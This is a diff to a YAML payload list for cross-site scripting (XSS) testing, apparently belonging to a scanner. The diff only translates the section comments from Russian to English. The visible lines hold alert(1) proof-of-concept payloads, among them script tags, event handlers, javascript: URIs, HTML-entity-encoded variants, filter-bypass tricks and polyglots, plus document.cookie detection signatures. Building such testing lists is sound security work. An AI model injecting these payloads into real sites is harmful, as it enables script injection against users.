@@ -14,7 +14,7 @@ signatures:
   - "document.cookie"
   - "document.domain"
 payloads:
-  # --- Классические script-теги ---
+  # --- Classic script tags ---
   - "<script>alert(1)</script>"
   - "<script>alert('XSS')</script>"
   - "<SCRIPT>alert(1)</SCRIPT>"
@@ -36,7 +36,7 @@ payloads:
   - "<details open ontoggle=alert(1)>"
   - "<marquee onstart=alert(1)>"
 
-  # --- javascript: схема ---
+  # --- javascript: scheme ---
   - "javascript:alert(1)"
   - "javascript:alert('XSS')"
   - "javascript:void(alert(1))"
@@ -52,7 +52,7 @@ payloads:
   - "<svg><set onbegin=alert(1) attributeName=x></svg>"
   - "<svg/onload=alert(1)>"
 
-  # --- HTML5-теги ---
+  # --- HTML5 tags ---
   - "<math><mtext></mtext><mglyph><svg><mtext></mtext><animatetransform onbegin=alert(1)></svg></mglyph></math>"
   - "<audio src=x onerror=alert(1)>"
   - "<object data='javascript:alert(1)'>"
@@ -64,7 +64,7 @@ payloads:
   - "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>"
   - "<a href='&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)'>click</a>"
 
-  # --- Обход фильтров ---
+  # --- Filter bypass ---
   - "<<script>alert(1);//<</script>"
   - "</script><script>alert(1)</script>"
   - "';alert(1);//"
@@ -74,6 +74,6 @@ payloads:
   - "<img src=\"`\" onerror=alert(1)>"
   - "<img src=x onerror=alert`1`>"
 
-  # --- Polyglot (работает в нескольких контекстах) ---
+  # --- Polyglot (works in multiple contexts) ---
   - "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"
   - "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//--></script>\">'><script>alert(String.fromCharCode(88,83,83))</script>"
